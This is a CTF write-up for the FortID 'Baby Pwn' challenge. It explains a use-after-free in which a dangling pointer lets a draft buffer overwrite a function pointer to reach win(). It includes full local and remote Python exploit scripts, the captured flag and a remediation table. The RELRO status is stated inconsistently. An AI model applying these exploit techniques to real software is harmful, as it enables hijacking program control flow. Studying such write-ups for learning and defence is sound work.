# Baby Pwn — Use-After-Free via Dangling Function Pointer | FortID CTF

## Executive Summary

The challenge presents a review-management service with a classic use-after-free vulnerability. A global favourite pointer is not nulled when the associated review object is freed, leaving a dangling reference. The write_draft function allocates a controllable buffer of identical size, allowing an attacker to reallocate the freed chunk and overwrite the display function pointer with the address of win(). Triggering preview_favourite then calls win(), which reads and prints the flag. The binary is a non-PIE 64-bit ELF with Partial RELRO, NX enabled, and stack canaries—no ASLR bypass or ROP chain required.

## Challenge Overview

Name: Baby Pwn
**Platform:** FortID CTF (inst14)
**Category:** Pwn / Binary Exploitation
**Flag Format:** FortID{...}
**Connection:** ncat --ssl baby-pwn-6d1d12b52973.inst14.ctf.fortid.com 1337
Everyone's opinion matters to us. Submit a review, save your thoughts for later, and make sure your favourite feedback is never forgotten. Can you leave one last review?
The service implements a simple menu-driven review system: submit a review, mark it as favourite, delete it, write a draft, preview the favourite, or exit.

<img width="1116" height="492" alt="image" src="https://github.com/user-attachments/assets/f3a8a90c-bb01-4b59-ac89-9ab76c997ea8" />

## Environment and Tools

| Tool | Version | Purpose |
| --- | --- | --- |
| file, readelf, nm, objdump | system | Binary triage, protections, symbol lookup |
| python3 | 3.12 | Exploit scripting, remote interaction |
| openssl / ssl module | system | TLS-wrapped socket to remote |
| zipfile (Python) | stdlib | Handout extraction |
| gcc / glibc | target | Local reproduction environment |

No specialized pwn frameworks (pwntools, ropper) were required—the exploit is ~30 lines of pure Python.

## Methodology and Reconnaissance

### 1. Handout Extraction and Source Review

Objective: Obtain and understand the challenge binary and source.
Action:
unzip -l "handout (9).zip"
python3 -c "import zipfile, pathlib; z=zipfile.ZipFile('handout (9).zip'); z.extractall('/tmp/babypwn9')"
cat /tmp/babypwn9/chall.c
Evidence: The zip contained chall.c (4.5 KB) and a precompiled chall binary (17 KB). Source reveals the full logic.
Interpretation: Having source eliminates reversing effort; focus shifts to vulnerability identification and exploit construction.

### 2. Binary Protections Check

Objective: Confirm mitigations (PIE, RELRO, NX, Canary, Fortify).
Action:
file /tmp/babypwn9/chall
readelf -l /tmp/babypwn9/chall | grep -i gnu
readelf -d /tmp/babypwn9/chall | grep BIND
nm /tmp/babypwn9/chall | grep win
Evidence:
- ELF 64-bit LSB executable, not stripped, not PIE (fixed base 0x400000)
- GNU_RELRO present, BIND_NOW set → Full RELRO
- GNU_STACK RW, no R → NX enabled
- __stack_chk_fail referenced → Stack canary present
- win at 0x40135f, show_review at 0x401336, globals at 0x404030 (review), 0x404038 (favourite), 0x404040 (draft)
Interpretation: Fixed code addresses mean win() is at a known offset. Full RELRO prevents GOT overwrite; NX prevents shellcode on stack/heap. The only viable target is a code pointer in writable memory—the display function pointer inside the review struct.

### 3. Vulnerability Identification (Source Audit)

Objective: Locate memory-safety issues.
Action: Read chall.c focusing on allocation, free, and pointer lifecycle.
Evidence (key excerpts):
struct review {
    char text[REVIEW_TEXT_SIZE];   // 32 bytes
    void (*display)(review_t *);   // 8 bytes (offset 32)
};

static review_t *review;
static review_t *favourite;
static draft_t *draft;   // contains char contents[sizeof(review_t)] → 40 bytes

static void delete_review(void) {
    if (review == NULL) { puts("..."); return; }
    free(review);
    review = NULL;           // review cleared
    // favourite NOT cleared!
    puts("Review deleted.");
}

static void write_draft(void) {
    if (draft != NULL) { puts("..."); return; }
    printf("Draft length (1-%zu): ", sizeof(draft->contents)); // 40
    length = read_number();
    if (length < 1 || (size_t)length > sizeof(draft->contents)) return;
    draft = malloc(sizeof(*draft));   // 40 bytes
    memset(draft->contents, 0, sizeof(draft->contents));
    printf("Send exactly %ld draft bytes: ", length);
    read_exact(draft->contents, (size_t)length);  // exact read, no newline trim
    puts("\nDraft saved.");
}

static void preview_favourite(void) {
    if (favourite == NULL) { puts("..."); return; }
    favourite->display(favourite);   // indirect call
}
Interpretation:
- review and draft are both 40 bytes (32 + 8).
- delete_review() frees review but leaves favourite pointing to the freed chunk.
- write_draft(40) allocates a 40-byte chunk; the allocator will likely reuse the just-freed review chunk.
- read_exact() copies exactly the supplied bytes into draft->contents, which overlays the review struct layout: first 32 bytes → text, next 8 bytes → display.
- Supplying 40 bytes with the last 8 set to &win overwrites favourite->display with win.
- preview_favourite() then calls win().

## Vulnerability Analysis

| Aspect | Detail |
| --- | --- |
| Component | delete_review / write_draft / preview_favourite |
| Weakness | Use-After-Free (CWE-416): dangling favourite pointer after free(review) |
| Root Cause | favourite not nulled in delete_review; no ownership tracking |
| Exploitable Primitive | Controlled 40-byte allocation reusing freed chunk → arbitrary function-pointer write |
| Trust Boundary | User-controlled draft data directly influences code execution via display |
| Prerequisites | 1. Submit a review (review allocated) 2. Mark favourite (favourite = review) 3. Delete review (review freed, favourite dangling) 4. Write draft of length 40 with crafted payload |
| Impact | Code execution → flag read (win() opens flag.txt) |

The vulnerability is deterministic: glibc's fastbin allocator will return the same 40-byte chunk for the subsequent malloc in write_draft. No heap grooming, no info leak, no ASLR defeat needed.

## Exploitation Walkthrough

Local Verification
First, confirm the exploit works against the local binary with a dummy flag.

# /tmp/babypwn9/exploit_local.py

import subprocess, struct, time, os, fcntl

p = subprocess.Popen(
    ['/tmp/babypwn9/chall'],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    cwd='/tmp/babypwn9'
)
open('/tmp/babypwn9/flag.txt', 'w').write('FortID{test_flag_local}\n')

def recv_until(delim):
    data = b''
    while delim not in data:
        c = p.stdout.read(1)
        if not c: break
        data += c
    print(data.decode(errors='replace'), end='')
    return data

def sendline(s):
    p.stdin.write((s + '\n').encode()); p.stdin.flush()
    print(f">> {s!r}")

def sendraw(b):
    p.stdin.write(b); p.stdin.flush()
    print(f">> raw {b!r}")

recv_until(b'> ')
sendline('1')                    # Submit review
recv_until(b'Review: ')
sendline('AAAA')
recv_until(b'> ')
sendline('2')                    # Mark favourite
recv_until(b'> ')
sendline('3')                    # Delete review (favourite dangles)
recv_until(b'> ')
sendline('4')                    # Write draft
recv_until(b'Draft length')
sendline('40')
recv_until(b'draft bytes: ')
payload = b'A' * 32 + struct.pack('<Q', 0x40135f)  # win address
sendraw(payload)
time.sleep(0.3)

# drain any output

flags = fcntl.fcntl(p.stdout.fileno(), fcntl.F_GETFL)
fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
try:
    while p.stdout.read(1): pass
except: pass
fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, flags)
recv_until(b'> ')
sendline('5')                    # Preview favourite → win()
time.sleep(0.3)
flags = fcntl.fcntl(p.stdout.fileno(), fcntl.F_GETFL)
fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
out = b''
try:
    while True:
        c = p.stdout.read(1)
        if not c: break
        out += c
except: pass
print(out.decode(errors='replace'))
p.terminate()
Result:
Five stars! Here is your prize:
FortID{test_flag_local}

Remote Exploitation
Identical logic over TLS.

# /tmp/babypwn9/exploit_remote.py

import socket, ssl, struct, time

HOST = "baby-pwn-6d1d12b52973.inst14.ctf.fortid.com"
PORT = 1337

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=10), server_hostname=HOST)
s.settimeout(5)

def recv_until(delim):
    data = b''
    while delim not in data:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
        print(chunk.decode(errors='replace'), end='')
    return data

def sendline(d):
    s.sendall(d.encode() + b'\n')
    print(f">> {d!r}")

def sendraw(d):
    s.sendall(d)
    print(f">> raw {d!r}")

recv_until(b'> ')
sendline('1')
recv_until(b'Review: ')
sendline('AAAA')
recv_until(b'> ')
sendline('2')
recv_until(b'> ')
sendline('3')
recv_until(b'> ')
sendline('4')
recv_until(b'Draft length')
sendline('40')
recv_until(b'draft bytes: ')
payload = b'A' * 32 + struct.pack('<Q', 0x40135f)
sendraw(payload)
time.sleep(0.5)
recv_until(b'> ')
sendline('5')

# flag arrives

recv_until(b'}')
Remote Output:
Welcome to One Last Review!
We value every review, even after it is gone.

1. Submit a review
2. Mark review as favourite
3. Delete review
4. Write a draft
5. Preview favourite review
6. Leave
> 1
Review: AAAA
Review submitted.
...
> 4
Draft length (1-40): 40
Send exactly 40 draft bytes:
Draft saved.
...
> 5
Five stars! Here is your prize:
FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_54e51e2791}

## Flag Retrieval and Verification

Flag: FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_54e51e2791}
The flag was printed directly by win() after preview_favourite invoked the hijacked display pointer. Format matches FortID{...} exactly.

## Root Cause and Remediation

| Issue | Fix |
| --- | --- |
| Dangling pointer (favourite not cleared on free) | Set favourite = NULL in delete_review when favourite == review. |
| User-controlled function pointer in heap | Avoid storing code pointers in user-controllable heap objects. Use a vtable in read-only memory or an enum dispatch. |
| Missing allocation-size separation | Make draft size distinct from review size (e.g., 64 bytes) to prevent fastbin reuse, but this is defense-in-depth only. |
| No integrity checks | Add a canary or generation counter in review; validate before indirect call. |

Production takeaway: Any object that holds a function pointer and can be freed must ensure all references are nulled or invalidated at free time. Reference counting, ownership semantics, or a single "owner" pointer that is the only one allowed to free are standard patterns.

## Lessons Learned

- Source code is a force multiplier. A 5-minute audit revealed the UAF; reversing would have taken longer.
- Fixed addresses (non-PIE) simplify exploitation drastically. The entire exploit is a single 40-byte payload with a hardcoded address.
- Fastbin determinism is reliable. Same-size alloc/free pairs in glibc fastbins return the same chunk without any heap shaping.
- Function pointers in heap objects are high-value targets. Even with Full RELRO and NX, a single controllable code pointer in writable memory is sufficient for arbitrary code execution.

-

## References

- chall.c (provided in handout)
- glibc malloc internals: https://sourceware.org/glibc/wiki/MallocInternals
- CWE-416 Use After Free: https://cwe.mitre.org/data/definitions/416.html
- "Exploiting Heap Overflows" (Phrack 57/8): http://phrack.org/issues/57/8.html

### Files used in the challenge

[handout (4).zip](https://github.com/user-attachments/files/33284220/handout.4.zip)
